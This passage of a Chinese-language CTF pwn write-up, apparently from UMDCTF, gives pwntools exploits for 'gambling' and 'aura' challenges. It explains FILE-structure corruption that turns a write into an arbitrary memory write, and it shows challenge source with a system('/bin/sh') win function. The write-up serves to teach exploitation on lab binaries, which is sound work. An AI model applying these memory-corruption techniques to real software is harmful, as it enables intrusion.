<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-bash language-bash"><span style="color:#59873A">pwndbg</span><span style="color:#393A34">></span><span style="color:#393A34"> </span><span style="color:#B56959">x/gf</span><span style="color:#2F798A"> 0xffdd4748</span><br><span style="color:#59873A">0xffdd4748:</span><span style="color:#B56959">     4.8678438292920787e-270</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-bash language-bash"><span style="color:#80A665">pwndbg</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> </span><span style="color:#C98A7D">x/gf</span><span style="color:#4C9A91"> 0xffdd4748</span><br><span style="color:#80A665">0xffdd4748:</span><span style="color:#C98A7D">     4.8678438292920787e-270</span><br></code></pre></div>
<p>exp:</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> ctypes</span><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./gambling_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    decompiler connect ida --host 127.0.0.1 --port 3662</span><br><span style="color:#B56959">    b *0x8049336</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># payload = f"0 0 0 0 0 {a} 6.6460445870511132e-316".encode()</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> 1.0 2.0 3.0 4.0 5.0 6.0 4.8678438292920787e-270</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter your lucky numbers: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> ctypes</span><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./gambling_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    decompiler connect ida --host 127.0.0.1 --port 3662</span><br><span style="color:#C98A7D">    b *0x8049336</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># payload = f"0 0 0 0 0 {a} 6.6460445870511132e-316".encode()</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> 1.0 2.0 3.0 4.0 5.0 6.0 4.8678438292920787e-270</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter your lucky numbers: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="aura" class="scroll-target"><a href="#aura"><code class="hash inline-code">#</code>aura</a></h2>
<p>题目给了源码：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdio.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">unistd.h</span><span style="color:#B5695977">></span><br><br><span style="color:#AB5959">int</span><span style="color:#393A34"> aura </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> main</span><span style="color:#2993a3">(</span><span style="color:#AB5959">int</span><span style="color:#B07D48"> argc</span><span style="color:#999999">,</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> **</span><span style="color:#B07D48">argv</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#59873A">        setbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdin</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        setbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdout</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        setbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stderr</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">        printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">my aura: </span><span style="color:#A65E2B">%p\n</span><span style="color:#B56959">ur aura? </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">aura</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">        char</span><span style="color:#B07D48"> flag</span><span style="color:#1e754f">[</span><span style="color:#2F798A">17</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#393A34">        FILE </span><span style="color:#AB5959">*</span><span style="color:#393A34">fp </span><span style="color:#999999">=</span><span style="color:#59873A"> fopen</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">/dev/null</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">r</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">        read</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#393A34"> fp</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">        char</span><span style="color:#B07D48"> buf</span><span style="color:#1e754f">[</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">100</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#59873A">        fread</span><span style="color:#1e754f">(</span><span style="color:#393A34">buf</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 8</span><span style="color:#999999">,</span><span style="color:#393A34"> fp</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">aura</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">                FILE </span><span style="color:#AB5959">*</span><span style="color:#393A34">f </span><span style="color:#999999">=</span><span style="color:#59873A"> fopen</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">flag.txt</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">r</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">                fread</span><span style="color:#a65e2b">(</span><span style="color:#393A34">flag</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 17</span><span style="color:#999999">,</span><span style="color:#393A34"> f</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">                printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">%s\n</span><span style="color:#B5695977"> "</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">        </span><span style="color:#1e754f">}</span><span style="color:#1E754F">  else</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">                printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">u have no aura.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">        </span><span style="color:#1e754f">}</span><br><br><span style="color:#1E754F">        return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdio.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">unistd.h</span><span style="color:#C98A7D77">></span><br><br><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> aura </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> main</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> argc</span><span style="color:#666666">,</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> **</span><span style="color:#BD976A">argv</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#80A665">        setbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdin</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        setbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        setbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stderr</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">        printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">my aura: </span><span style="color:#C99076">%p\n</span><span style="color:#C98A7D">ur aura? </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">aura</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">        char</span><span style="color:#BD976A"> flag</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">17</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">        FILE </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">fp </span><span style="color:#666666">=</span><span style="color:#80A665"> fopen</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/dev/null</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">        read</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> fp</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">        char</span><span style="color:#BD976A"> buf</span><span style="color:#4d9375">[</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">100</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#80A665">        fread</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> fp</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">aura</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#DBD7CAEE">                FILE </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">f </span><span style="color:#666666">=</span><span style="color:#80A665"> fopen</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">flag.txt</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">                fread</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 17</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> f</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">                printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%s\n</span><span style="color:#C98A7D77"> "</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">        </span><span style="color:#4d9375">}</span><span style="color:#4D9375">  else</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">                printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">u have no aura.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">        </span><span style="color:#4d9375">}</span><br><br><span style="color:#4D9375">        return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>相当于可以任意写 FILE 结构，要求是通过这个原语修改 <code class="inline-code">aura > 0</code>。</p>
<p>满足下列条件即可：</p>
<ul>
<li>设置 <code class="inline-code">fp->_flags &amp; (~0x4)</code>（这里最好就是用原来的 <code class="inline-code">_flags</code>）（也就是要设置倒数第二字节为 <code class="inline-code">\x00</code>）</li>
<li>设置 <code class="inline-code">_IO_read_end</code> 等于 <code class="inline-code">_IO_read_ptr</code></li>
<li>设置 <code class="inline-code">_fileno == 0</code></li>
<li>设置 <code class="inline-code">fp->_IO_buf_base</code> 为写入的起始位置，<code class="inline-code">fp->_IO_buf_end</code> 为写入的终止位置，<code class="inline-code">fp->_IO_buf_end - fp->_IO_buf_base</code> 为读入的长度</li>
</ul>
<p>exp:</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">arch </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">amd64</span><span style="color:#B5695977">'</span><br><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">./aura_patched</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># p = remote("challs.umdctf.io", 31006)</span><br><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">p</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    breakrva 0x1253</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># pause()</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">leak </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#999999">:</span><span style="color:#AB5959">-</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A">16</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">fp </span><span style="color:#999999">=</span><span style="color:#393A34"> FileStructure</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> fp</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#2993a3">(</span><span style="color:#393A34">leak</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">0</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">arch </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">'</span><br><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./aura_patched</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># p = remote("challs.umdctf.io", 31006)</span><br><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    breakrva 0x1253</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># pause()</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">leak </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#4d9375">[</span><span style="color:#666666">:</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91">16</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">fp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> FileStructure</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> fp</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">leak</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="unfinished" class="scroll-target"><a href="#unfinished"><code class="hash inline-code">#</code>unfinished</a></h2>
<p>神秘 c++ trick 题。</p>
<p>题目给了源码：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">cstdio</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">cstdlib</span><span style="color:#B5695977">></span><br><br><span style="color:#AB5959">char</span><span style="color:#B07D48"> number</span><span style="color:#2993a3">[</span><span style="color:#2F798A">128</span><span style="color:#2993a3">]</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">void</span><span style="color:#59873A"> sigma_mode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#59873A">    system</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> main</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#59873A">    setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdout</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#393A34"> _IONBF</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdin</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#393A34"> _IONBF</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">What size allocation?</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    fgets</span><span style="color:#1e754f">(</span><span style="color:#393A34">number</span><span style="color:#999999">,</span><span style="color:#2F798A"> 500</span><span style="color:#999999">,</span><span style="color:#393A34"> stdin</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">    long</span><span style="color:#393A34"> n </span><span style="color:#999999">=</span><span style="color:#59873A"> atol</span><span style="color:#1e754f">(</span><span style="color:#393A34">number</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    int</span><span style="color:#AB5959"> *</span><span style="color:#393A34">chunk </span><span style="color:#999999">=</span><span style="color:#393A34"> new </span><span style="color:#AB5959">int</span><span style="color:#1e754f">[</span><span style="color:#393A34">n</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#A0ADA0">    // TODO: finish the heap chal</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" 